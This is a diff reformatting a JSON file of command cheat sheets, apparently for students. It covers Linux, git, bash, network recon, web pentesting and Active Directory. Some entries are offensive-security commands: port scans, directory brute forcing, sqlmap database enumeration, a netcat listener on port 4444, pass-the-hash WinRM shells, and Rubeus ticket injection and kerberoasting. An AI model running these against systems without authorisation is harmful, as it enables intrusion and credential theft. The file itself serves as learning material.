@@ -1,1 +1,2551 @@
-[{"description":"The essential Linux commands for navigating the system, managing files, permissions, users, processes, and basic networking.","sections":[{"heading":"Navigation","rows":[{"command":"pwd","description":"Show your current directory path"},{"command":"ls -la","description":"List all files including hidden ones"},{"command":"cd <dir>","description":"Move into a directory"},{"command":"cd ..","description":"Move up one directory level"},{"command":"cd ~","description":"Jump back to your home directory"},{"command":"find / -name \"*.conf\" 2>/dev/null","description":"Search the filesystem by filename"}]},{"heading":"Files and Directories","rows":[{"command":"touch file.txt","description":"Create an empty file"},{"command":"mkdir -p dir/subdir","description":"Create nested directories at once"},{"command":"cp -r src dst","description":"Copy files or directories recursively"},{"command":"mv old new","description":"Move or rename a file"},{"command":"rm -rf dir","description":"Delete a directory and contents"},{"command":"cat file.txt","description":"Print a whole file to terminal"},{"command":"less file.txt","description":"Scroll through a file page by page"},{"command":"head -n 20 file.txt","description":"Show the first 20 lines"},{"command":"tail -n 20 file.txt","description":"Show the last 20 lines"},{"command":"tail -f /var/log/auth.log","description":"Follow a log file live"},{"command":"grep -ri \"password\" /etc","description":"Search file contents for a word"},{"command":"wc -l file.txt","description":"Count lines in a file"}]},{"heading":"Permissions and Users","rows":[{"command":"chmod 755 script.sh","description":"Set owner rwx, others read and execute"},{"command":"chmod +x script.sh","description":"Make a file executable"},{"command":"chown user:group file","description":"Change file owner and group"},{"command":"whoami","description":"Show your current username"},{"command":"id","description":"Show your user and group IDs"},{"command":"sudo -l","description":"List commands you can run as root"},{"command":"sudo su -","description":"Switch to a root shell"}]},{"heading":"Processes and System","rows":[{"command":"ps aux | grep ssh","description":"List running processes matching ssh"},{"command":"top","description":"Live view of running processes"},{"command":"htop","description":"Friendlier interactive process viewer"},{"command":"kill -9 <PID>","description":"Force kill a process by ID"},{"command":"df -h","description":"Show disk space in readable units"},{"command":"free -h","description":"Show memory and swap usage"},{"command":"uname -a","description":"Show kernel and system info"},{"command":"uptime","description":"Show how long the system runs"}]},{"heading":"Networking Basics","rows":[{"command":"ip a","description":"Show all network interfaces and addresses"},{"command":"ss -tuln","description":"List listening TCP and UDP ports"},{"command":"ping -c 4 8.8.8.8","description":"Send 4 ping packets to test connectivity"},{"command":"curl -I https://example.com","description":"Fetch only HTTP response headers"}]}],"slug":"linux-basics","title":"Linux Basics"},{"description":"Commands for testing connectivity, inspecting ports and DNS, and scanning hosts during reconnaissance.","sections":[{"heading":"Connectivity","rows":[{"command":"ping -c 4 target.com","description":"Send 4 pings to check reachability"},{"command":"traceroute target.com","description":"Trace the route packets take"},{"command":"mtr target.com","description":"Combined ping and traceroute, live"},{"command":"curl -I https://target.com","description":"Show only the HTTP response headers"},{"command":"curl -s -L https://target.com","description":"Follow redirects silently, show body"},{"command":"curl -X POST -d \"a=1\" https://target.com/api","description":"Send a POST request with data"},{"command":"wget https://target.com/file.zip","description":"Download a file over HTTP"}]},{"heading":"Ports and Sockets","rows":[{"command":"ss -tuln","description":"List listening TCP and UDP ports"},{"command":"ss -tupn","description":"Show processes using each TCP socket"},{"command":"netstat -tuln","description":"Older tool listing listening ports"},{"command":"nc -zv target.com 1-1000","description":"Scan TCP ports 1 to 1000"},{"command":"nc -lvnp 4444","description":"Listen on port 4444 for connections"}]},{"heading":"DNS","rows":[{"command":"dig target.com","description":"Query DNS records for a domain"},{"command":"dig target.com ANY +short","description":"Get all record types, short output"},{"command":"dig -x 93.184.216.34","description":"Reverse lookup an IP address"},{"command":"nslookup target.com","description":"Simple DNS lookup with defaults"},{"command":"host target.com","description":"Quick DNS lookup, one line answer"}]},{"heading":"Nmap Essentials","rows":[{"command":"nmap target.com","description":"Scan the top 1000 TCP ports"},{"command":"nmap -sV target.com","description":"Detect service versions on open ports"},{"command":"nmap -sC target.com","description":"Run default NSE scripts on targets"},{"command":"nmap -p- target.com","description":"Scan all 65535 TCP ports"},{"command":"nmap -A target.com","description":"Aggressive scan: OS, versions, scripts"},{"command":"nmap -sn 192.168.1.0/24","description":"Ping sweep to find live hosts"},{"command":"nmap -sU --top-ports 50 target.com","description":"Scan the top 50 UDP ports"},{"command":"nmap -oN scan.txt target.com","description":"Save normal scan output to file"}]}],"slug":"networking-commands","title":"Networking and Recon"},{"description":"Practical commands for web application testing: directory discovery, fingerprinting, scanning, and SQL injection testing.","sections":[{"heading":"Directory and Content Discovery","rows":[{"command":"ffuf -u https://target.com/FUZZ -w wordlist.txt","description":"Fuzz paths on the web root"},{"command":"ffuf -u https://target.com/FUZZ -w wordlist.txt -e .php,.bak,.txt","description":"Fuzz paths with file extensions"},{"command":"ffuf -u https://target.com/FUZZ -w wordlist.txt -fc 404","description":"Hide 404 responses in results"},{"command":"gobuster dir -u https://target.com -w wordlist.txt","description":"Brute force directories and files"},{"command":"gobuster dir -u https://target.com -w wordlist.txt -x php,txt,bak","description":"Brute force with extra extensions"},{"command":"gobuster dns -d target.com -w subdomains.txt","description":"Brute force subdomains via DNS"}]},{"heading":"Fingerprinting","rows":[{"command":"whatweb https://target.com","description":"Identify tech stack of a site"},{"command":"whatweb -v https://target.com","description":"Verbose fingerprint with plugin detail"},{"command":"curl -I https://target.com","description":"Inspect server and security headers"},{"command":"nikto -h https://target.com","description":"Scan for known web misconfigurations"}]},{"heading":"SQL Injection Testing","rows":[{"command":"sqlmap -u \"https://target.com/page?id=1\"","description":"Test a URL parameter for SQLi"},{"command":"sqlmap -u \"https://target.com/page?id=1\" --dbs","description":"Enumerate databases after injection found"},{"command":"sqlmap -u \"https://target.com/page?id=1\" -D db --tables","description":"List tables inside one database"},{"command":"sqlmap -r request.txt --batch","description":"Test a saved request file automatically"},{"command":"sqlmap -u \"https://target.com/page?id=1\" --level 3 --risk 2","description":"Deeper tests with more payloads"}]},{"heading":"Parameter and Header Fuzzing","rows":[{"command":"ffuf -u \"https://target.com/page?FUZZ=1\" -w params.txt","description":"Fuzz parameter names on an endpoint"},{"command":"ffuf -u https://target.com/ -w wordlist.txt -H \"X-FUZZ: test\"","description":"Fuzz a custom HTTP header value"},{"command":"curl -s \"https://target.com/page?id=1'\" | head -c 500","description":"Test for error based SQLi quickly"},{"command":"gobuster vhost -u https://target.com -w subdomains.txt","description":"Brute force virtual hosts on one IP"},{"command":"ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,403","description":"Show only chosen status codes"}]}],"slug":"web-pentest","title":"Web Pentest Workflow"},{"description":"Commands for Windows enumeration and Active Directory recon, from PowerShell basics to domain queries.","sections":[{"heading":"PowerShell Essentials","rows":[{"command":"Get-ChildItem -Recurse C:\\Users","description":"List files recursively under Users"},{"command":"Get-Process | Where-Object {$_.CPU -gt 100}","description":"Show processes using lots of CPU"},{"command":"Get-Service | Where-Object {$_.Status -eq 'Running'}","description":"List all running services"},{"command":"Test-NetConnection target.com -Port 445","description":"Test if a TCP port is open"},{"command":"Get-LocalUser","description":"List local user accounts"},{"command":"Get-LocalGroupMember Administrators","description":"List local admin group members"},{"command":"Invoke-WebRequest -Uri https://example.com/f -OutFile f.exe","description":"Download a file with PowerShell"}]},{"heading":"Local Enumeration","rows":[{"command":"whoami /all","description":"Show user, groups, and privileges"},{"command":"net user","description":"List local user accounts"},{"command":"net localgroup administrators","description":"List local administrators"},{"command":"net user <username> /domain","description":"Show details of a domain user"},{"command":"systeminfo","description":"Show OS, patches, and uptime"},{"command":"ipconfig /all","description":"Show full network configuration"}]},{"heading":"Domain Recon","rows":[{"command":"net group \"Domain Admins\" /domain","description":"List domain admin members"},{"command":"net group /domain","description":"List all groups in the domain"},{"command":"nltest /domain_trusts","description":"Show trusts between domains"},{"command":"nltest /dclist:domain.local","description":"Find domain controllers for a domain"},{"command":"setspn -Q */*","description":"List service principal names in AD"},{"command":"Get-ADUser -Filter * -Properties *","description":"Dump all domain user objects"},{"command":"Get-ADComputer -Filter *","description":"List all computers in the domain"}]},{"heading":"Remote Access and Ticket Tools","rows":[{"command":"evil-winrm -i 10.10.10.10 -u user -p 'pass'","description":"Open a WinRM shell on a target"},{"command":"evil-winrm -i 10.10.10.10 -u user -H <nthash>","description":"WinRM shell using a password hash"},{"command":"Rubeus.exe asktgt /user:user /password:pass /domain:dom.local","description":"Request a Kerberos TGT ticket"},{"command":"Rubeus.exe asktgs /service:cifs/dc.dom.local /ptt","description":"Request a service ticket, inject it"},{"command":"Rubeus.exe kerberoast","description":"Request crackable Kerberos service tickets"}]}],"slug":"windows-ad","title":"Windows and Active Directory"},{"description":"The git commands students actually use daily: cloning, committing, branching, syncing, and fixing mistakes.","sections":[{"heading":"Getting Started","rows":[{"command":"git clone https://github.com/user/repo.git","description":"Copy a remote repo to your machine"},{"command":"git init","description":"Start a new repo in a folder"},{"command":"git status","description":"Show changed and untracked files"}]},{"heading":"Saving Changes","rows":[{"command":"git add .","description":"Stage all changes for commit"},{"command":"git add file.txt","description":"Stage one specific file"},{"command":"git commit -m \"message\"","description":"Save staged changes with a message"},{"command":"git commit -am \"message\"","description":"Stage tracked files and commit together"},{"command":"git diff","description":"Show unstaged changes line by line"},{"command":"git diff --staged","description":"Show staged changes before committing"}]},{"heading":"Syncing with Remote","rows":[{"command":"git push origin main","description":"Upload commits to the remote main branch"},{"command":"git pull","description":"Fetch and merge remote changes"},{"command":"git fetch","description":"Download remote changes without merging"},{"command":"git remote -v","description":"Show configured remote URLs"}]},{"heading":"Branches","rows":[{"command":"git branch","description":"List local branches"},{"command":"git checkout -b feature","description":"Create and switch to a branch"},{"command":"git switch feature","description":"Switch to an existing branch"},{"command":"git merge feature","description":"Merge a branch into the current one"},{"command":"git branch -d feature","description":"Delete a merged branch"}]},{"heading":"History and Undo","rows":[{"command":"git log --oneline -10","description":"Show last 10 commits, one per line"},{"command":"git stash","description":"Shelve changes to switch context cleanly"},{"command":"git stash pop","description":"Restore the most recent stash"},{"command":"git checkout -- file.txt","description":"Discard unstaged changes in a file"},{"command":"git reset HEAD file.txt","description":"Unstage a file, keep its changes"}]},{"heading":"Simple Conflicts","rows":[{"command":"git pull origin main","description":"Pull first when push is rejected"},{"command":"git status","description":"See which files have conflicts"},{"command":"git mergetool","description":"Open a visual merge tool for conflicts"},{"command":"git add file.txt && git commit","description":"Mark conflict resolved and commit"},{"command":"git merge --abort","description":"Cancel the merge and start over"}]}],"slug":"git-essentials","title":"Git Essentials"},{"description":"Bash scripting building blocks: variables, conditionals, loops, functions, and one-liners you can reuse.","sections":[{"heading":"Variables","rows":[{"command":"name=\"izaz\"","description":"Assign a string to a variable"},{"command":"echo \"Hello $name\"","description":"Print text with variable expansion"},{"command":"read -p \"Target: \" target","description":"Prompt and read user input"},{"command":"count=$((count + 1))","description":"Do arithmetic on a variable"}]},{"heading":"Conditionals","rows":[{"command":"if [ -f file.txt ]; then echo \"exists\"; fi","description":"Run code if a file exists"},{"command":"if [ \"$a\" = \"$b\" ]; then echo \"equal\"; fi","description":"Compare two strings for equality"},{"command":"if [ $n -gt 10 ]; then echo \"big\"; fi","description":"Compare numbers, greater than"},{"command":"[ -d dir ] && echo \"is dir\"","description":"Short test that a path is a directory"}]},{"heading":"Loops","rows":[{"command":"for i in {1..10}; do echo $i; done","description":"Loop numbers 1 through 10"},{"command":"for f in *.txt; do cat \"$f\"; done","description":"Loop over every txt file"},{"command":"while read line; do echo \"$line\"; done < file.txt","description":"Read a file line by line"},{"command":"for ip in 192.168.1.{1..254}; do ping -c1 -W1 $ip & done","description":"Ping sweep a subnet in parallel"}]},{"heading":"Functions","rows":[{"command":"greet() { echo \"Hi $1\"; }","description":"Define a function taking one argument"},{"command":"greet izaz","description":"Call a function with an argument"},{"command":"scan() { nmap -sV \"$1\"; }","description":"Wrap nmap in a reusable function"},{"command":"return 0","description":"Exit a function with success status"}]},{"heading":"Useful One-Liners","rows":[{"command":"grep -r \"TODO\" . --include=\"*.py\"","description":"Find TODO comments in Python files"},{"command":"find . -name \"*.log\" -delete","description":"Delete all log files recursively"},{"command":"ps aux | sort -nrk 3 | head -5","description":"Show the 5 most CPU hungry processes"},{"command":"history | awk '{print $2}' | sort | uniq -c | sort -nr | head","description":"Rank your most used commands"},{"command":"tar -czf backup.tar.gz dir/","description":"Compress a directory into a tarball"},{"command":"chmod +x script.sh && ./script.sh","description":"Make executable and run a script"}]}],"slug":"bash-scripting","title":"Bash Scripting"}]
+[
+ {
+  "description": "The essential Linux commands for navigating the system, managing files, permissions, users, processes, and basic networking.",
+  "sections": [
+   {
+    "heading": "Navigation",
+    "rows": [
+     {
+      "command": "pwd",
+      "description": "Show your current directory path"
+     },
+     {
+      "command": "ls -la",
+      "description": "List all files including hidden ones"
+     },
+     {
+      "command": "cd <dir>",
+      "description": "Move into a directory"
+     },
+     {
+      "command": "cd ..",
+      "description": "Move up one directory level"
+     },
+     {
+      "command": "cd ~",
+      "description": "Jump back to your home directory"
+     },
+     {
+      "command": "find / -name \"*.conf\" 2>/dev/null",
+      "description": "Search the filesystem by filename"
+     }
+    ]
+   },
+   {
+    "heading": "Files and Directories",
+    "rows": [
+     {
+      "command": "touch file.txt",
+      "description": "Create an empty file"
+     },
+     {
+      "command": "mkdir -p dir/subdir",
+      "description": "Create nested directories at once"
+     },
+     {
+      "command": "cp -r src dst",
+      "description": "Copy files or directories recursively"
+     },
+     {
+      "command": "mv old new",
+      "description": "Move or rename a file"
+     },
+     {
+      "command": "rm -rf dir",
+      "description": "Delete a directory and contents"
+     },
+     {
+      "command": "cat file.txt",
+      "description": "Print a whole file to terminal"
+     },
+     {
+      "command": "less file.txt",
+      "description": "Scroll through a file page by page"
+     },
+     {
+      "command": "head -n 20 file.txt",
+      "description": "Show the first 20 lines"
+     },
+     {
+      "command": "tail -n 20 file.txt",
+      "description": "Show the last 20 lines"
+     },
+     {
+      "command": "tail -f /var/log/auth.log",
+      "description": "Follow a log file live"
+     },
+     {
+      "command": "grep -ri \"password\" /etc",
+      "description": "Search file contents for a word"
+     },
+     {
+      "command": "wc -l file.txt",
+      "description": "Count lines in a file"
+     }
+    ]
+   },
+   {
+    "heading": "Permissions and Users",
+    "rows": [
+     {
+      "command": "chmod 755 script.sh",
+      "description": "Set owner rwx, others read and execute"
+     },
+     {
+      "command": "chmod +x script.sh",
+      "description": "Make a file executable"
+     },
+     {
+      "command": "chown user:group file",
+      "description": "Change file owner and group"
+     },
+     {
+      "command": "whoami",
+      "description": "Show your current username"
+     },
+     {
+      "command": "id",
+      "description": "Show your user and group IDs"
+     },
+     {
+      "command": "sudo -l",
+      "description": "List commands you can run as root"
+     },
+     {
+      "command": "sudo su -",
+      "description": "Switch to a root shell"
+     }
+    ]
+   },
+   {
+    "heading": "Processes and System",
+    "rows": [
+     {
+      "command": "ps aux | grep ssh",
+      "description": "List running processes matching ssh"
+     },
+     {
+      "command": "top",
+      "description": "Live view of running processes"
+     },
+     {
+      "command": "htop",
+      "description": "Friendlier interactive process viewer"
+     },
+     {
+      "command": "kill -9 <PID>",
+      "description": "Force kill a process by ID"
+     },
+     {
+      "command": "df -h",
+      "description": "Show disk space in readable units"
+     },
+     {
+      "command": "free -h",
+      "description": "Show memory and swap usage"
+     },
+     {
+      "command": "uname -a",
+      "description": "Show kernel and system info"
+     },
+     {
+      "command": "uptime",
+      "description": "Show how long the system runs"
+     }
+    ]
+   },
+   {
+    "heading": "Networking Basics",
+    "rows": [
+     {
+      "command": "ip a",
+      "description": "Show all network interfaces and addresses"
+     },
+     {
+      "command": "ss -tuln",
+      "description": "List listening TCP and UDP ports"
+     },
+     {
+      "command": "ping -c 4 8.8.8.8",
+      "description": "Send 4 ping packets to test connectivity"
+     },
+     {
+      "command": "curl -I https://example.com",
+      "description": "Fetch only HTTP response headers"
+     }
+    ]
+   }
+  ],
+  "slug": "linux-basics",
+  "title": "Linux Basics"
+ },
+ {
+  "description": "Commands for testing connectivity, inspecting ports and DNS, and scanning hosts during reconnaissance.",
+  "sections": [
+   {
+    "heading": "Connectivity",
+    "rows": [
+     {
+      "command": "ping -c 4 target.com",
+      "description": "Send 4 pings to check reachability"
+     },
+     {
+      "command": "traceroute target.com",
+      "description": "Trace the route packets take"
+     },
+     {
+      "command": "mtr target.com",
+      "description": "Combined ping and traceroute, live"
+     },
+     {
+      "command": "curl -I https://target.com",
+      "description": "Show only the HTTP response headers"
+     },
+     {
+      "command": "curl -s -L https://target.com",
+      "description": "Follow redirects silently, show body"
+     },
+     {
+      "command": "curl -X POST -d \"a=1\" https://target.com/api",
+      "description": "Send a POST request with data"
+     },
+     {
+      "command": "wget https://target.com/file.zip",
+      "description": "Download a file over HTTP"
+     }
+    ]
+   },
+   {
+    "heading": "Ports and Sockets",
+    "rows": [
+     {
+      "command": "ss -tuln",
+      "description": "List listening TCP and UDP ports"
+     },
+     {
+      "command": "ss -tupn",
+      "description": "Show processes using each TCP socket"
+     },
+     {
+      "command": "netstat -tuln",
+      "description": "Older tool listing listening ports"
+     },
+     {
+      "command": "nc -zv target.com 1-1000",
+      "description": "Scan TCP ports 1 to 1000"
+     },
+     {
+      "command": "nc -lvnp 4444",
+      "description": "Listen on port 4444 for connections"
+     }
+    ]
+   },
+   {
+    "heading": "DNS",
+    "rows": [
+     {
+      "command": "dig target.com",
+      "description": "Query DNS records for a domain"
+     },
+     {
+      "command": "dig target.com ANY +short",
+      "description": "Get all record types, short output"
+     },
+     {
+      "command": "dig -x 93.184.216.34",
+      "description": "Reverse lookup an IP address"
+     },
+     {
+      "command": "nslookup target.com",
+      "description": "Simple DNS lookup with defaults"
+     },
+     {
+      "command": "host target.com",
+      "description": "Quick DNS lookup, one line answer"
+     }
+    ]
+   },
+   {
+    "heading": "Nmap Essentials",
+    "rows": [
+     {
+      "command": "nmap target.com",
+      "description": "Scan the top 1000 TCP ports"
+     },
+     {
+      "command": "nmap -sV target.com",
+      "description": "Detect service versions on open ports"
+     },
+     {
+      "command": "nmap -sC target.com",
+      "description": "Run default NSE scripts on targets"
+     },
+     {
+      "command": "nmap -p- target.com",
+      "description": "Scan all 65535 TCP ports"
+     },
+     {
+      "command": "nmap -A target.com",
+      "description": "Aggressive scan: OS, versions, scripts"
+     },
+     {
+      "command": "nmap -sn 192.168.1.0/24",
+      "description": "Ping sweep to find live hosts"
+     },
+     {
+      "command": "nmap -sU --top-ports 50 target.com",
+      "description": "Scan the top 50 UDP ports"
+     },
+     {
+      "command": "nmap -oN scan.txt target.com",
+      "description": "Save normal scan output to file"
+     }
+    ]
+   }
+  ],
+  "slug": "networking-commands",
+  "title": "Networking and Recon"
+ },
+ {
+  "description": "Practical commands for web application testing: directory discovery, fingerprinting, scanning, and SQL injection testing.",
+  "sections": [
+   {
+    "heading": "Directory and Content Discovery",
+    "rows": [
+     {
+      "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt",
+      "description": "Fuzz paths on the web root"
+     },
+     {
+      "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -e .php,.bak,.txt",
+      "description": "Fuzz paths with file extensions"
+     },
+     {
+      "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -fc 404",
+      "description": "Hide 404 responses in results"
+     },
+     {
+      "command": "gobuster dir -u https://target.com -w wordlist.txt",
+      "description": "Brute force directories and files"
+     },
+     {
+      "command": "gobuster dir -u https://target.com -w wordlist.txt -x php,txt,bak",
+      "description": "Brute force with extra extensions"
+     },
+     {
+      "command": "gobuster dns -d target.com -w subdomains.txt",
+      "description": "Brute force subdomains via DNS"
+     }
+    ]
+   },
+   {
+    "heading": "Fingerprinting",
+    "rows": [
+     {
+      "command": "whatweb https://target.com",
+      "description": "Identify tech stack of a site"
+     },
+     {
+      "command": "whatweb -v https://target.com",
+      "description": "Verbose fingerprint with plugin detail"
+     },
+     {
+      "command": "curl -I https://target.com",
+      "description": "Inspect server and security headers"
+     },
+     {
+      "command": "nikto -h https://target.com",
+      "description": "Scan for known web misconfigurations"
+     }
+    ]
+   },
+   {
+    "heading": "SQL Injection Testing",
+    "rows": [
+     {
+      "command": "sqlmap -u \"https://target.com/page?id=1\"",
+      "description": "Test a URL parameter for SQLi"
+     },
+     {
+      "command": "sqlmap -u \"https://target.com/page?id=1\" --dbs",
+      "description": "Enumerate databases after injection found"
+     },
+     {
+      "command": "sqlmap -u \"https://target.com/page?id=1\" -D db --tables",
+      "description": "List tables inside one database"
+     },
+     {
+      "command": "sqlmap -r request.txt --batch",
+      "description": "Test a saved request file automatically"
+     },
+     {
+      "command": "sqlmap -u \"https://target.com/page?id=1\" --level 3 --risk 2",
+      "description": "Deeper tests with more payloads"
+     }
+    ]
+   },
+   {
+    "heading": "Parameter and Header Fuzzing",
+    "rows": [
+     {
+      "command": "ffuf -u \"https://target.com/page?FUZZ=1\" -w params.txt",
+      "description": "Fuzz parameter names on an endpoint"
+     },
+     {
+      "command": "ffuf -u https://target.com/ -w wordlist.txt -H \"X-FUZZ: test\"",
+      "description": "Fuzz a custom HTTP header value"
+     },
+     {
+      "command": "curl -s \"https://target.com/page?id=1'\" | head -c 500",
+      "description": "Test for error based SQLi quickly"
+     },
+     {
+      "command": "gobuster vhost -u https://target.com -w subdomains.txt",
+      "description": "Brute force virtual hosts on one IP"
+     },
+     {
+      "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,403",
+      "description": "Show only chosen status codes"
+     }
+    ]
+   }
+  ],
+  "slug": "web-pentest",
+  "title": "Web Pentest Workflow"
+ },
+ {
+  "description": "Commands for Windows enumeration and Active Directory recon, from PowerShell basics to domain queries.",
+  "sections": [
+   {
+    "heading": "PowerShell Essentials",
+    "rows": [
+     {
+      "command": "Get-ChildItem -Recurse C:\\Users",
+      "description": "List files recursively under Users"
+     },
+     {
+      "command": "Get-Process | Where-Object {$_.CPU -gt 100}",
+      "description": "Show processes using lots of CPU"
+     },
+     {
+      "command": "Get-Service | Where-Object {$_.Status -eq 'Running'}",
+      "description": "List all running services"
+     },
+     {
+      "command": "Test-NetConnection target.com -Port 445",
+      "description": "Test if a TCP port is open"
+     },
+     {
+      "command": "Get-LocalUser",
+      "description": "List local user accounts"
+     },
+     {
+      "command": "Get-LocalGroupMember Administrators",
+      "description": "List local admin group members"
+     },
+     {
+      "command": "Invoke-WebRequest -Uri https://example.com/f -OutFile f.exe",
+      "description": "Download a file with PowerShell"
+     }
+    ]
+   },
+   {
+    "heading": "Local Enumeration",
+    "rows": [
+     {
+      "command": "whoami /all",
+      "description": "Show user, groups, and privileges"
+     },
+     {
+      "command": "net user",
+      "description": "List local user accounts"
+     },
+     {
+      "command": "net localgroup administrators",
+      "description": "List local administrators"
+     },
+     {
+      "command": "net user <username> /domain",
+      "description": "Show details of a domain user"
+     },
+     {
+      "command": "systeminfo",
+      "description": "Show OS, patches, and uptime"
+     },
+     {
+      "command": "ipconfig /all",
+      "description": "Show full network configuration"
+     }
+    ]
+   },
+   {
+    "heading": "Domain Recon",
+    "rows": [
+     {
+      "command": "net group \"Domain Admins\" /domain",
+      "description": "List domain admin members"
+     },
+     {
+      "command": "net group /domain",
+      "description": "List all groups in the domain"
+     },
+     {
+      "command": "nltest /domain_trusts",
+      "description": "Show trusts between domains"
+     },
+     {
+      "command": "nltest /dclist:domain.local",
+      "description": "Find domain controllers for a domain"
+     },
+     {
+      "command": "setspn -Q */*",
+      "description": "List service principal names in AD"
+     },
+     {
+      "command": "Get-ADUser -Filter * -Properties *",
+      "description": "Dump all domain user objects"
+     },
+     {
+      "command": "Get-ADComputer -Filter *",
+      "description": "List all computers in the domain"
+     }
+    ]
+   },
+   {
+    "heading": "Remote Access and Ticket Tools",
+    "rows": [
+     {
+      "command": "evil-winrm -i 10.10.10.10 -u user -p 'pass'",
+      "description": "Open a WinRM shell on a target"
+     },
+     {
+      "command": "evil-winrm -i 10.10.10.10 -u user -H <nthash>",
+      "description": "WinRM shell using a password hash"
+     },
+     {
+      "command": "Rubeus.exe asktgt /user:user /password:pass /domain:dom.local",
+      "description": "Request a Kerberos TGT ticket"
+     },
+     {
+      "command": "Rubeus.exe asktgs /service:cifs/dc.dom.local /ptt",
+      "description": "Request a service ticket, inject it"
+     },
+     {
+      "command": "Rubeus.exe kerberoast",
+      "description": "Request crackable Kerberos service tickets"
+     }
+    ]
+   }
+  ],
+  "slug": "windows-ad",
+  "title": "Windows and Active Directory"
+ },
+ {
+  "description": "The git commands students actually use daily: cloning, committing, branching, syncing, and fixing mistakes.",
+  "sections": [
+   {
+    "heading": "Getting Started",
+    "rows": [
+     {
+      "command": "git clone https://github.com/user/repo.git",
+      "description": "Copy a remote repo to your machine"
+     },
+     {
+      "command": "git init",
+      "description": "Start a new repo in a folder"
+     },
+     {
+      "command": "git status",
+      "description": "Show changed and untracked files"
+     }
+    ]
+   },
+   {
+    "heading": "Saving Changes",
+    "rows": [
+     {
+      "command": "git add .",
+      "description": "Stage all changes for commit"
+     },
+     {
+      "command": "git add file.txt",
+      "description": "Stage one specific file"
+     },
+     {
+      "command": "git commit -m \"message\"",
+      "description": "Save staged changes with a message"
+     },
+     {
+      "command": "git commit -am \"message\"",
+      "description": "Stage tracked files and commit together"
+     },
+     {
+      "command": "git diff",
+      "description": "Show unstaged changes line by line"
+     },
+     {
+      "command": "git diff --staged",
+      "description": "Show staged changes before committing"
+     }
+    ]
+   },
+   {
+    "heading": "Syncing with Remote",
+    "rows": [
+     {
+      "command": "git push origin main",
+      "description": "Upload commits to the remote main branch"
+     },
+     {
+      "command": "git pull",
+      "description": "Fetch and merge remote changes"
+     },
+     {
+      "command": "git fetch",
+      "description": "Download remote changes without merging"
+     },
+     {
+      "command": "git remote -v",
+      "description": "Show configured remote URLs"
+     }
+    ]
+   },
+   {
+    "heading": "Branches",
+    "rows": [
+     {
+      "command": "git branch",
+      "description": "List local branches"
+     },
+     {
+      "command": "git checkout -b feature",
+      "description": "Create and switch to a branch"
+     },
+     {
+      "command": "git switch feature",
+      "description": "Switch to an existing branch"
+     },
+     {
+      "command": "git merge feature",
+      "description": "Merge a branch into the current one"
+     },
+     {
+      "command": "git branch -d feature",
+      "description": "Delete a merged branch"
+     }
+    ]
+   },
+   {
+    "heading": "History and Undo",
+    "rows": [
+     {
+      "command": "git log --oneline -10",
+      "description": "Show last 10 commits, one per line"
+     },
+     {
+      "command": "git stash",
+      "description": "Shelve changes to switch context cleanly"
+     },
+     {
+      "command": "git stash pop",
+      "description": "Restore the most recent stash"
+     },
+     {
+      "command": "git checkout -- file.txt",
+      "description": "Discard unstaged changes in a file"
+     },
+     {
+      "command": "git reset HEAD file.txt",
+      "description": "Unstage a file, keep its changes"
+     }
+    ]
+   },
+   {
+    "heading": "Simple Conflicts",
+    "rows": [
+     {
+      "command": "git pull origin main",
+      "description": "Pull first when push is rejected"
+     },
+     {
+      "command": "git status",
+      "description": "See which files have conflicts"
+     },
+     {
+      "command": "git mergetool",
+      "description": "Open a visual merge tool for conflicts"
+     },
+     {
+      "command": "git add file.txt && git commit",
+      "description": "Mark conflict resolved and commit"
+     },
+     {
+      "command": "git merge --abort",
+      "description": "Cancel the merge and start over"
+     }
+    ]
+   }
+  ],
+  "slug": "git-essentials",
+  "title": "Git Essentials"
+ },
+ {
+  "description": "Bash scripting building blocks: variables, conditionals, loops, functions, and one-liners you can reuse.",
+  "sections": [
+   {
+    "heading": "Variables",
+    "rows": [
+     {
+      "command": "name=\"izaz\"",
+      "description": "Assign a string to a variable"
+     },
+     {
+      "command": "echo \"Hello $name\"",
+      "description": "Print text with variable expansion"
+     },
+     {
+      "command": "read -p \"Target: \" target",
+      "description": "Prompt and read user input"
+     },
+     {
+      "command": "count=$((count + 1))",
+      "description": "Do arithmetic on a variable"
+     }
+    ]
+   },
+   {
+    "heading": "Conditionals",
+    "rows": [
+     {
+      "command": "if [ -f file.txt ]; then echo \"exists\"; fi",
+      "description": "Run code if a file exists"
+     },
+     {
+      "command": "if [ \"$a\" = \"$b\" ]; then echo \"equal\"; fi",
+      "description": "Compare two strings for equality"
+     },
+     {
+      "command": "if [ $n -gt 10 ]; then echo \"big\"; fi",
+      "description": "Compare numbers, greater than"
+     },
+     {
+      "command": "[ -d dir ] && echo \"is dir\"",
+      "description": "Short test that a path is a directory"
+     }
+    ]
+   },
+   {
+    "heading": "Loops",
+    "rows": [
+     {
+      "command": "for i in {1..10}; do echo $i; done",
+      "description": "Loop numbers 1 through 10"
+     },
+     {
+      "command": "for f in *.txt; do cat \"$f\"; done",
+      "description": "Loop over every txt file"
+     },
+     {
+      "command": "while read line; do echo \"$line\"; done < file.txt",
+      "description": "Read a file line by line"
+     },
+     {
+      "command": "for ip in 192.168.1.{1..254}; do ping -c1 -W1 $ip & done",
+      "description": "Ping sweep a subnet in parallel"
+     }
+    ]
+   },
+   {
+    "heading": "Functions",
+    "rows": [
+     {
+      "command": "greet() { echo \"Hi $1\"; }",
+      "description": "Define a function taking one argument"
+     },
+     {
+      "command": "greet izaz",
+      "description": "Call a function with an argument"
+     },
+     {
+      "command": "scan() { nmap -sV \"$1\"; }",
+      "description": "Wrap nmap in a reusable function"
+     },
+     {
+      "command": "return 0",
+      "description": "Exit a function with success status"
+     }
+    ]
+   },
+   {
+    "heading": "Useful One-Liners",
+    "rows": [
+     {
+      "command": "grep -r \"TODO\" . --include=\"*.py\"",
+      "description": "Find TODO comments in Python files"
+     },
+     {
+      "command": "find . -name \"*.log\" -delete",
+      "description": "Delete all log files recursively"
+     },
+     {
+      "command": "ps aux | sort -nrk 3 | head -5",
+      "description": "Show the 5 most CPU hungry processes"
+     },
+     {
+      "command": "history | awk '{print $2}' | sort | uniq -c | sort -nr | head",
+      "description": "Rank your most used commands"
+     },
+     {
+      "command": "tar -czf backup.tar.gz dir/",
+      "description": "Compress a directory into a tarball"
+     },
+     {
+      "command": "chmod +x script.sh && ./script.sh",
+      "description": "Make executable and run a script"
+     }
+    ]
+   }
+  ],
+  "slug": "bash-scripting",
+  "title": "Bash Scripting"
+ },
